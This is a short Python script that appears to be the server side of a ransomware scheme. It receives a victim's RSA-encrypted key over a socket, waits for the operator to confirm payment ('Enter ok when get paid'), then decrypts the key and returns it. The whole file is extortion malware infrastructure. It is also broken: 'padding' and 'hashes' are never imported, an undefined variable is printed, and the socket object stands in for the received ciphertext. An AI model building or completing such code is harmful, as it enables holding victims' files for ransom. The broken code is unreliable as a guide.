import socket
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import load_pem_private_key

# step 7
s = socket.socket()
s.bind(('localhost', 12345))
s.listen(1) # amount of connections allowed
while True:
	c, addr = s.accept()
	print('Received connection from ', addr)
	print(c.recv(2048)) # receive two bytes?

	random_key_encrypted = c
	print(random_key_decrypted)
	
	# step 8 - lulz

	# step 9
	ok = input('Enter \'ok\' when get paid: ')
	if (random_key_encrypted and ok == 'ok'): # get a better check
		with open('private_key.pem', 'rb') as f:
			pem_data = f.read()
		private_key = load_pem_private_key(pem_data, password=None, backend=default_backend())
		print(isinstance(private_key, rsa.RSAPrivateKey))

		random_key = private_key.decrypt(
			random_key_encrypted,
			padding.OAEP(
				mgf=padding.MGF1(algorithm=hashes.SHA256()),
				algorithm=hashes.SHA256(),
				label=None
			)
		)

		c.sendall(random_key)
		break
	else:
		# disconnect the client
		# have them connect again and give key again?
		pass 
s.close()
